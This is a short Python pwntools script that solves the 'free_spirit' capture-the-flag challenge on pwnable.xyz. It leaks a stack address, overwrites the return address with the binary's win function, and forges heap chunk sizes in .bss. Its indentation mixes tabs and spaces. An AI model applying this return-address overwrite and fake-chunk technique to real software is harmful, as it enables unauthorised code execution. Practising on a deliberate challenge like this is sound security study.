from pwn import *
#p = process("./free_spirit")
p = remote("svc.pwnable.xyz", 30005)
elf = ELF("./free_spirit")
bss = 0x601030
pause()
def inp(data):
	p.sendlineafter(">", "1")
	p.send(data)

def leak():
	p.sendlineafter(">", "2")
	return int(p.recvline(), 16)
def movdqu():
	p.sendlineafter(">", "3")

if __name__ == "__main__":
	stack = leak()
	p.success("stack : " + hex(stack))
        p.success("rip : " + hex(stack + 0x58))
        p.success("bss : " + hex(bss))
        payload = "a" * 8 + p64(stack + 0x58)
        inp(payload)
        movdqu()
        inp(p64(elf.symbols['win']) + p64(bss + 0x8))
        movdqu()
        inp(p64(0x51) + p64(bss + 0x58))
        movdqu()
        inp(p64(0x51) + p64(bss + 0x10))
        movdqu()
	p.interactive()
